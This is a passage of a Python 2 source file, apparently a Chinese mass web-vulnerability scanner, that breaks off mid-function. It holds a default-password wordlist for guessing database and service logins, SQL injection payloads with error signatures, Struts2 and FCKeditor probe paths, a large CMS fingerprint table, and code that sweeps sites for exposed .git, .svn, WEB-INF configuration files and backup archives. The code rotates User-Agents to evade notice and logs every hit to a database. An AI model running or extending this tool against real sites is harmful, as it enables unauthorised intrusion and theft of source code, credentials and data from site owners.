# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
import binascii
import urllib
import base64
import pymysql
import cx_Oracle
import random
import psycopg2
import MySQLdb
import paramiko
import pymongo
import socket
import ConfigParser
import uuid
import hashlib
import urllib2
import codecs
import requests
import pymssql
from ftplib import FTP
import telnetlib
import re
import datetime
import time
import threading
import socket
import httplib
import os
reload(sys)
sys.setdefaultencoding('utf-8')
timeout = 5
socket.setdefaulttimeout(timeout)
# print '''
# __    __  _____   _           ___   __   _   _____       ___
# \ \  / / /  _  \ | |         /   | |  \ | | |  _  \     /   |
#  \ \/ /  | | | | | |        / /| | |   \| | | | | |    / /| |
#   \  /   | | | | | |       / / | | | |\   | | | | |   / / | |
#   / /    | |_| | | |___   / /  | | | | \  | | |_| |  / /  | |
#  /_/     \_____/ |_____| /_/   |_| |_|  \_| |_____/ /_/   |_|
#
# '''
# time.sleep(5)
# print '''
#     Author:Yolanda_Liu
#     Debug:Langzi
#     Data:2018-5-20
#
# '''
# time.sleep(2)

cfg = ConfigParser.ConfigParser()
cfg.read('Config.ini')
user = cfg.get("Server", "username")
passwd = cfg.get("Server", "password")
host = cfg.get("Server", "host")
New_start=cfg.get("Config","new_start")
Rarscan=cfg.get("Config","rarscan")
Sqlscan=cfg.get("Config","sqlscan")
Cmsscan=cfg.get("Config","cmsscan")
St2scan=cfg.get("Config","st2scan")
Portscan=cfg.get("Config","portscan")
Editorscan=cfg.get("Config","editorscan")
Urlcj= cfg.get("Config","urlcaiji")
Dbname = cfg.get("Server","db")
thread_s = cfg.get("Config","thread_s")
scan2url = cfg.get("Config","scan_2url")
scanunauthorized = cfg.get("Config","unauthorizedscan")

list_001 = []
fck=['/fckeditor/editor/filemanager/browser/default/connectors/test.html','/fckeditor/editor/filemanager/connectors/test.html','/FCKeditor/editor/filemanager/connectors/uploadtest.html','/FCKeditor/editor/filemanager/upload/test.html','/FCKeditor/editor/fckeditor.html']
st = ['VloginUser.action','Mail.action','code.action','reg.action','Address.action','!Index.action','login.action','Add.action','pageslist.action','.Action','Message.action','getMul.action','shouye.action','logout.action','Valid.action','search.action','Magazine.action','news.action','init.action','create.action','index2.action','default.action','welcome.action','Name.action','single.action','updateForm.action','SysStart.action','adminlogin.action','Offportal.action','Buying.action','Success.action','exchange.action','menu.action','airport.action','Email.action','On.action','show.action','tain.action','randomPicture.action','news.do']
backup_name_A = ['.rar','.zip','.tar','.tar.bz2','.sql','.7z','.bak','.txt','.tar.gz','.iso','.gz']
dic_user=['root','admin','guest','system','administrator']
dic_pass=['root','','admin','axis2','system','123456','12345','admin1234','a12345','tomcat','guest','password','123456789','888888','a123456','111111','000000','mysql','5201314','from91','12345678','123123','11111111','163.com','fill.com','123321','123123123','00000000','1314520','7758521','1234567','666666','123456a','1234567890','woaini','a123456789','88888888','147258369','qq123456','654321','zxcvbnm','woaini1314','112233','5211314','123456abc','520520','aaaaaa','123654','987654321','123456789a','7758258','100200','147258','111222','abc123456','111222tianya','121212','1111111','abc123','110110','789456','q123456','123456aa','aa123456','asdasd','999999','123qwe','789456123','1111111111','1314521','iloveyou','qwerty','qazwsx','159357','222222','woaini520','woaini123','521521','asd123','qqqqqq','qq1111','1234','qwe123']
#要和域名组合在一起拼接的后缀
backup_name_B = list(set([i.replace("\n","") for i in open("rar.txt","r").readlines()]))
#常见的后缀
port = [8080,3128,8081,21,22,23,25,443,445,3306,3389,1433,1521,81,7001,27017,6379,2181,9200,11211,2375,9000,8069]

first_cule= ["com/'>","cn/'>","cc/'>","net/'>","org/'>",".com/",".cn/",".cc/",".net/",".org/",'com">','com/"','cn">','cn/"','net">','net/"','cc">','cc/"','org">','org/"']
headerss = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
            "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24" ]
body = {'content="WordPress':'WordPress','wp-includes':'WordPress',
        'pma_password':'phpMyAdmin',
        'AdaptCMS':'AdaptCMS',
        'TUTUCMS':'tutucms','Powered by TUTUCMS':'tutucms',
        'Powered by 1024 CMS':'1024 CMS','1024 CMS (c)':'1024 CMS',
        'Publish By JCms2010':'捷点 JCMS',
        'webEdition':'webEdition',
        'Powered by phpshe':'phpshe','phpshe':'phpshe',
        '/theme/2009/image&login.asp':'北京清科锐华CEMIS',
        'css/25yi.css':'25yi','Powered by 25yi':'25yi',
        '/bundles/oroui/':'oroCRM',
        'Powered by SeaCms':'海洋CMS','seacms':'海洋CMS',
        '/images/v7/cms.css':'qibosoft v7',
        'opac_two':'北创图书检索系统',
        'dayrui/statics':'dayrui系列CMS',
        'upload/moban/images/style.css':'ASP168 欧虎','default.php?mod=article&do=detail&tid':'ASP168 欧虎',
        'Powered by FineCMS':'FineCMS','dayrui@gmail.com':'FineCMS','FineCMS':'FineCMS',
        'ASPCMS':'ASPCMS',
        '/index.php/clasify/showone/gtitle/':'O2OCMS',
        'CmsEasy':'CmsEasy',
        'damicms':'大米CMS','大米CMS':'大米CMS',
        '/Include/EcsServerApi.js':'易创思ecs',
        'Osclass':'Osclass',
        'm_ctr32':'IdeaCMS','Powered By IdeaCMS':'IdeaCMS',
        'bit-xxzs':'Bit','xmlpzs/webissue.asp':'Bit',
        '/css/mymps.css':'mymps','mymps':'mymps',
        'ycportal/webpublish':'全国烟草系统',
        'bx_css_async':'Dolphin',
        '/tpl/Home/weimeng/common/css/':'微门户',
        'DianCMS_用户登陆引用':'易点CMS','DianCMS_SiteName':'易点CMS',
        'r/cms/www':'unknown cms rcms',
        '技术支持：云因信息':'yunyin','<a href="../scrp/getpassword.cfm':'yunyin','/scrp/book.cfm" method="post':'yunyin',
        'PDV_PAGENAME':'PHPWEB',
        'Author" content="微普外卖点餐系统':'微普外卖点餐系统','Powered By 点餐系统':'微普外卖点餐系统','userfiles/shoppics/':'微普外卖点餐系统',
        'content="jieqi cms':'jieqi',
        'Powerd by AppCMS':'appcms',
        'content="OURPHP':'ourphp','Powered by ourphp':'ourphp',
        'content="eAdmin':'eadmin',
        'Powered by FengCms':'fengcms','content="FengCms':'fengcms',
        'content="DotNetNuke':'DotNetNuke','content=",DotNetNuke':'DotNetNuke',
        'Power by DedeCms':'DedeCMS','Powered by&http://www.dedecms.com/':'DedeCMS','/templets/default/style/dedecms.css':'DedeCMS',
        'Created by DotNetCMS':'Foosun','For Foosun':'Foosun','Powered by www.Foosun.net,Products:Foosun Content Manage system':'Foosun',
        '/deptWebsiteAction.do':'某通用型政府cms',
        'Powered by wuzhicms':'wuzhicms','content="wuzhicms':'wuzhicms',
        '_files/jspxcms.css':'Jspxcms',
        'NITC Web Marketing Service':'NITC','/images/nitc1.png':'NITC',
        'reader/view_abstract.aspx':'E-Tiller',
        'content="IMGCMS':'IMGCms','Powered by IMGCMS':'IMGCms',
        '/r/cms/www/':'RCMS','jhtml':'RCMS',
        '/js/jtbc.js':'JTBC(CMS)','content="JTBC':'JTBC(CMS)',
        'Powered by TurboCMS':'TurboCMS','/cmsapp/zxdcADD.jsp':'TurboCMS','/cmsapp/count/newstop_index.jsp?siteid=':'TurboCMS',
        '本系统由<span class="STYLE1" ><a href="http://www.firstknow.cn':'中国期刊先知网','<img src="images/logoknow.png"':'中国期刊先知网',
        '/js/jPackageCss/jPackage.css':'贷齐乐p2p','src="/js/jPackage':'贷齐乐p2p',
        'generator" content="Typecho':'Typecho','强力驱动&Typecho':'Typecho',
        'content="BageCMS':'八哥CMS',
        'content="动力启航,DTCMS':'dtcms',
        'keyicms：keyicms':'科蚁CMS','Powered by <a href="http://www.keyicms.com':'科蚁CMS',
        'web980':'DIYWAP','bannerNum':'DIYWAP',
        'generator" content="Plone':'plone',
        'app/Tpl/fanwe_1/images/lazy_loading.gif&index.php?ctl=article_cate':'方维众筹',
        'css/css_whir.css':'万户网络',
        'wsite-page-index':'weebly',
        'content="niubicms':'牛逼cms',
        '/Widgets/WidgetCollection/':'We7',
        '/css/yxcms.css':'Yxcms','content="Yxcms':'Yxcms',
        'Powered by Diferior':'Diferior',
        'Powered by PHPVOD':'phpvod','content="phpvod':'phpvod',
        'Dolibarr Development Team':'Dolibarr',
        'Telerik.Web.UI.WebResource.axd':'Telerik Sitefinity','content="Sitefinity':'Telerik Sitefinity',
        'main/building.cfm':'云因网上书店','href="../css/newscomm.css':'云因网上书店',
        'content="tipask':'Tipask',
        'yidacms.css':'yidacms',
        'advfile/ad12.js':'XYCMS',
        'powerd by&BEESCMS':'beeCMS','template/default/images/slides.min.jquery.js':'beeCMS',
        'Powered by ESPCMS':'ESPCMS','infolist_fff&/templates/default/style/tempates_div.css':'ESPCMS',
        'webplus':'webplus','高校网站群管理平台':'webplus',
        'content="WeiPHP':'weiphp','/css/weiphp.css':'weiphp',
        'publish by BoyowCMS':'BoyowCMS',
        'generator" content="ezCMS':'concrete5','CCM_DISPATCHER_FILENAME':'concrete5',
        '凡科互联网科技股份有限公司':'凡科建站','content="凡科':'凡科建站',
        '/css/cmstop-common.css':'CMSTop','/js/cmstop-common.js':'CMSTop','cmstop-list-text.css':'CMSTop','<a class="poweredby" href="http://www.cmstop.com"':'CMSTop',
        'Powered by Adxstudio':'ADXStudio','poweredbyadx.png':'ADXStudio',
        'Powered by DouPHP':'DouPHP','controlBase&indexLeft':'DouPHP',  #三个&未写方法  只效验前两个 &recommendProduct
        'content="MetInfo':'MetInfo','powered_by_metinfo':'MetInfo','/images/css/metinfo.css':'MetInfo',
        'chanzhi.js':'chanzhi','\>\<a href=.+www.chanzhi.org':'chanzhi',
        'content="Drupal':'Drupal','jQuery.extend\(Drupal.settings':'Drupal','ace-drupal7prod&/sites/all/themes/':'Drupal',   #/sites/all/modules/  /sites/default/files/
        'Powered By PHPB2B':'phpb2b',
        'Powered by&http://www.phpcms.cn':'PhpCMS','Powered by Phpcms':'PhpCMS','data/config.js':'PhpCMS',
        'SiteServer CMS&http://www.siteserver.cn':'SiteServer','T_系统首页模板':'SiteServer','siteserver&sitefiles':'SiteServer',
        'JEECMS&Powered by':'JEECMS',
        'script src="http://code.zoomla.cn/':'逐浪zoomla','NodePage.aspx&body="Item':'逐浪zoomla','/style/images/win8_symbol_140x140.png':'逐浪zoomla',
        'Powered by Phpmps':'phpmps','templates/phpmps/style/index.css':'phpmps',
        'Powered by Dswjcms':'dswjcms','content="Dswjcms':'dswjcms',
        'maccms:voddaycount':'苹果CMS',
        'content="PageAdmin CMS':'PageAdmin','/e/images/favicon.ico':'PageAdmin',
        '_ZCMS_ShowNewMessage':'ZCMS','zcms_skin':'ZCMS','zcms':'ZCMS',
        'NewsClass.asp?BigClass=企业新闻':'南方良精','HrDemand.asp':'南方良精','Aboutus.asp?Title=企业简介':'南方良精',
        'lan12-jingbian-hong':'易普拉格科研管理系统','科研管理系统，北京易普拉格科技':'易普拉格科研管理系统',
        '/ks_inc/common.js':'KesionCMS','publish by KesionCMS':'KesionCMS',
        'bigSortProduct.asp?bigid':'北京阳光环球建站系统',
        'content="NIUCMS':'niucms',
        'index.php\?ac=link_more&index.php\?ac=news_list':'TCCMS',   #未找到实例
        'publico/template/&zonapie':'360webfacil 360WebManager','360WebManager Software':'360webfacil 360WebManager',
        'labelOppInforStyle':'地平线CMS','search_result.aspx&frmsearch':'地平线CMS',
        'FoxPHPScroll':'FoxPHP','FoxPHP_ImList':'FoxPHP','content="FoxPHP':'FoxPHP',
        'var webroot=':'sdcms','/js/sdcms.js':'sdcms',
        '/wcm/app/js':'TRS WCM','0;URL=/wcm':'TRS WCM','window.location.href = "//wcm";':'TRS WCM','forum\.trs\.com\.cn&wcm':'TRS WCM',
        '/wcm" target="_blank':'TRS WCM','/wcm" target="_blank">管理':'TRS WCM',
        '/templates/default/css/common.css&selectjobscategory':'74cms','Powered by <a href="http://www\.74cms\.com/':'74cms','content="74cms.com':'74cms','content="骑士CMS':'74cms',
        'Generator" content="2z project':'2z project',
        'generator" content="MediaWiki':'MediaWiki','/wiki/images/6/64/Favicon.ico':'MediaWiki','Powered by MediaWiki':'MediaWiki',
        '/app/home/skins/default/style.css':'ThinkSAAS',
        'content="Joomla':'Joomla','/media/system/js/core\.js&/media/system/js/mootools-core\.js':'Joomla',
        'phpMyWind.com All Rights Reserved':'PHPMyWind','content="PHPMyWind':'PHPMyWind',
        'semcms PHP':'SEMcms','sc_mid_c_left_c sc_mid_left_bt':'SEMcms',
        '/Template/Ant/Css/AntHomeComm\.css':'小蚂蚁',
        'content="171cms':'171cms',
        'content="BAOCMS':'baocms',
        'infoglueBox.png':'infoglue',
        'power by bcms':'bluecms','bcms_plugin':'bluecms',
        'content="MoMoCMS':'MoMoCMS','Powered BY MoMoCMS':'MoMoCMS',
        '/css/global\.css&/twcms/theme/':'TWCMS',
        'content="emlog"':'Emlog',
        'GB_ROOT_DIR&maincontent.css':'HIMS 酒店云计算服务','HIMS酒店云计算服务':'HIMS 酒店云计算服务',
        'GENERATOR" content="EasySite':'Easysite','Copyright 2009 by Huilan':'Easysite','_DesktopModules_PictureNews':'Easysite',
        '页面加载中,请稍候&FrontEnd':'国家数字化学习资源中心系统',
        }
robots = ['EmpireCMS','PHPCMS v9','Discuz','joomla','siteserver','dedecms','php168','phpcms','emlog']


payloads = ("'", "')", "';", '"', '")','order by 5 %23--', '";',"--","-0",") AND 1998=1532 AND (5526=5526"," AND 5434=5692%23"," %' AND 5268=2356 AND '%'='"," ') AND 6103=4103 AND ('vPKl'='vPKl"," ' AND 7738=8291 AND 'UFqV'='UFqV",'`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
sql_errors = {'SQL syntax':'mysql','syntax to use near':'mysql','MySQLSyntaxErrorException':'mysql','valid MySQL result':'mysql',
              'Access Database Engine':'Access','JET Database Engine':'Access','Microsoft Access Driver':'Access',
            'SQLServerException':'mssql','SqlException':'mssql','SQLServer JDBC Driver':'mssql','Incorrect syntax':'mssql',
              'MySQL Query fail':'mysql'
         }

def scan_backupfile(url):
    try:
        web_title = '获取网站标题失败'
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_info_top = requests.get(url=url, headers=headers, timeout=5)
        if r_info_top.encoding == 'ISO-8859-1':
            encodings = requests.utils.get_encodings_from_content(r_info_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_info_top.apparent_encoding
            encode_content = r_info_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            web_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_info_top.encoding == 'GB2312':
            encodings = requests.utils.get_encodings_from_content(r_info_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_info_top.apparent_encoding
            encode_content = r_info_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            web_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_info_top.encoding == 'gb2312':
            encodings = requests.utils.get_encodings_from_content(r_info_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_info_top.apparent_encoding
            encode_content = r_info_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            web_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_info_top.encoding == 'GBK':
            encodings = requests.utils.get_encodings_from_content(r_info_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_info_top.apparent_encoding
            encode_content = r_info_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            web_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_info_top.encoding == 'gbk':
            encodings = requests.utils.get_encodings_from_content(r_info_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_info_top.apparent_encoding
            encode_content = r_info_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            web_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        else:
            web_title = re.search('<title>(.*?)</title>', r_info_top.content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                '</title>', '')
    except:
        try:
            web_title = re.search('<title>(.*?)</title>', r_info_top.content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                '</title>', '')
        except:
            web_title = '暂时无法获取网站标题'
    # 这个函数是专门扫描备份文件 敏感信息泄露  接受的参数是url
    url_svn = url + '/.svn/entries'
    #print 'Cheaking>>>' + url_svn
    # 扫描svn源码泄露  组合成链接
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_svn = requests.head(url=url_svn, headers=headers, timeout=5)
        # 访问这个链接  超时设置5秒
        #print r_svn.url + " : " + str(r_svn.status_code)
        # 打印出这个网址 和 访问状态码
        print str(threading.current_thread().name) + ' ' + str(url_svn) + '  ' + str(r_svn.status_code)
        if r_svn.status_code == 200:
            # 如果状态码是200  表示访问成功
            try:
                r_svn_1 = requests.get(url=url_svn,headers=headers,timeout=5)
                if 'dir' in r_svn_1.content and 'svn://' in r_svn_1.content:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_svn = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_svn = coon_svn.cursor()
                        sql_svn = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_svn.execute(sql_svn, (str(r_svn_1.url), str('Svn源码泄漏'), str(web_title),str(timenow)))
                        coon_svn.commit()
                        cur_svn.close()
                        coon_svn.close()
                        time.sleep(random.randint(1,5))
                    except:
                        pass
            except:
                pass
        else:
            pass
    except Exception, e:
        pass

        #print e
        ######################################
        # svn源码泄露扫描完毕
        ######################################
    url_git = url + '/.git/config'
    #print 'Cheaking>>>' + url_git
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_git = requests.head(url=url_git, headers=headers, timeout=5)
        #print r_git.url + " : " + str(r_git.status_code)
        print str(threading.current_thread().name) + ' ' + str(url_git) + '  ' + str(r_git.status_code)
        if r_git.status_code == 200:
            try:
                r_git_1 = requests.get(url=url_git, headers=headers, timeout=5)
                if 'repositoryformatversion' in r_git_1.content:
                    # repositoryformatversion 这个是git源码泄露的特征码
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_git = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_git = coon_git.cursor()
                        sql_git = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_git.execute(sql_git, (str(r_git_1.url), str('Git源码泄露'), str(web_title),str(timenow)))
                        coon_git.commit()
                        cur_git.close()
                        coon_git.close()
                        time.sleep(random.randint(2,6))
                    except:
                        pass
                else:
                    pass
            except Exception, e:
                #print e
                pass
    except Exception, e:
        #print e
        pass
        ######################################
        # git源码泄露扫描完毕
        ######################################
    url_git = url + '/.git/index'
    #print 'Cheaking>>>' + url_git
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_git = requests.head(url=url_git, headers=headers, timeout=5)
        #print r_git.url + " : " + str(r_git.status_code)
        print str(threading.current_thread().name) + ' ' + str(url_git) + '  ' + str(r_git.status_code)
        if r_git.status_code == 200:
            try:
                r_git_1 = requests.get(url=url_git, headers=headers, timeout=5)
                if 'DIRC' in r_git_1.content:
                    # repositoryformatversion 这个是git源码泄露的特征码
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_git = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_git = coon_git.cursor()
                        sql_git = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_git.execute(sql_git, (str(r_git_1.url), str('Git源码泄露'), str(web_title),str(timenow)))
                        coon_git.commit()
                        cur_git.close()
                        coon_git.close()
                        time.sleep(random.randint(2,6))
                    except:
                        pass
                else:
                    pass
            except Exception, e:
                #print e
                pass
    except Exception, e:
        #print e
        pass
    url_git = url + '/.git/HEAD'
    #print 'Cheaking>>>' + url_git
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_git = requests.head(url=url_git, headers=headers, timeout=5)
        #print r_git.url + " : " + str(r_git.status_code)
        print str(threading.current_thread().name) + ' ' + str(url_git) + '  ' + str(r_git.status_code)
        if r_git.status_code == 200:
            try:
                r_git_1 = requests.get(url=url_git, headers=headers, timeout=5)
                if 'refs/heads/' in r_git_1.content:
                    # repositoryformatversion 这个是git源码泄露的特征码
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_git = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_git = coon_git.cursor()
                        sql_git = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_git.execute(sql_git, (str(r_git_1.url), str('Git源码泄露'), str(web_title),str(timenow)))
                        coon_git.commit()
                        cur_git.close()
                        coon_git.close()
                        time.sleep(random.randint(2,6))
                    except:
                        pass
                else:
                    pass
            except Exception, e:
                #print e
                pass
    except Exception, e:
        #print e
        pass
    url_info = url + '/WEB-INF/web.xml'
    #print 'Cheaking>>>' + url_git
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_info = requests.head(url=url_info, headers=headers, timeout=5)
        #print r_git.url + " : " + str(r_git.status_code)
        print str(threading.current_thread().name) + ' ' + str(r_info.url) + '  ' + str(r_info.status_code)
        if r_info.status_code == 200:
            try:
                r_info_1=requests.get(url=url_info,headers=headers,timeout=5)
                if '<web-app' in r_info_1.content:
                    # repositoryformatversion 这个是git源码泄露的特征码
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_info = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_info = coon_info.cursor()
                        sql_info = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_info.execute(sql_info, (str(r_info_1.url), str('Java WEB应用安全目录'), str(web_title),str(timenow)))
                        coon_info.commit()
                        cur_info.close()
                        coon_info.close()
                        time.sleep(random.randint(2,5))
                    except:
                        pass
                else:
                    pass
            except Exception, e:
                #print e
                pass
    except Exception, e:
        #print e
        pass
        ######################################
        # webinfo源码泄露扫描完毕
        ######################################
    url_info = url + '/WEB-INF/config/dbconfig'
    #print 'Cheaking>>>' + url_git
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_info = requests.head(url=url_info, headers=headers, timeout=5)
        #print r_git.url + " : " + str(r_git.status_code)
        print str(threading.current_thread().name) + ' ' + str(r_info.url) + '  ' + str(r_info.status_code)
        if r_info.status_code == 200:
            try:
                r_info_1=requests.get(url=url_info,headers=headers,timeout=5)
                if 'passw' in r_info_1.content:
                    # repositoryformatversion 这个是git源码泄露的特征码
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_info = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_info = coon_info.cursor()
                        sql_info = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_info.execute(sql_info, (str(r_info_1.url), str('Java WEB应用安全目录'), str(web_title),str(timenow)))
                        coon_info.commit()
                        cur_info.close()
                        coon_info.close()
                        time.sleep(random.randint(2,5))
                    except:
                        pass
                else:
                    pass
            except Exception, e:
                #print e
                pass
    except Exception, e:
        #print e
        pass
    url_info = url + '/WEB-INF/config.xml'
    #print 'Cheaking>>>' + url_git
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_info = requests.head(url=url_info, headers=headers, timeout=5)
        #print r_git.url + " : " + str(r_git.status_code)
        print str(threading.current_thread().name) + ' ' + str(r_info.url) + '  ' + str(r_info.status_code)
        if r_info.status_code == 200:
            try:
                r_info_1=requests.get(url=url_info,headers=headers,timeout=5)
                if '<?xml' in r_info_1.content:
                    # repositoryformatversion 这个是git源码泄露的特征码
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_info = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_info = coon_info.cursor()
                        sql_info = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_info.execute(sql_info, (str(r_info_1.url), str('Java WEB应用安全目录'), str(web_title),str(timenow)))
                        coon_info.commit()
                        cur_info.close()
                        coon_info.close()
                        time.sleep(random.randint(2,5))
                    except:
                        pass
                else:
                    pass
            except Exception, e:
                #print e
                pass
    except Exception, e:
        #print e
        pass
    url_domain = url + '/' + url.split(".", 2)[1]
    # http://www.baidu.com/baidu
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain = requests.head(url=str(url_domain + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain.url) + '  ' + str(r_domain.status_code)
            if r_domain.status_code == 200:
                try:
                    if int(r_domain.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain.headers["Content-Length"])/1000000)+'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2,6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕-+-+-+-+-9
            ######################################
    url_domain_0 = url + '/' + url.split('//',2)[1]
    # http://www.baidu.com/www.baidu.com
    
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_0 = requests.head(url=str(url_domain_0 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_0.url) + '  ' + str(r_domain_0.status_code)
            if r_domain_0.status_code == 200:
                try:
                    if int(r_domain_0.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_0.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
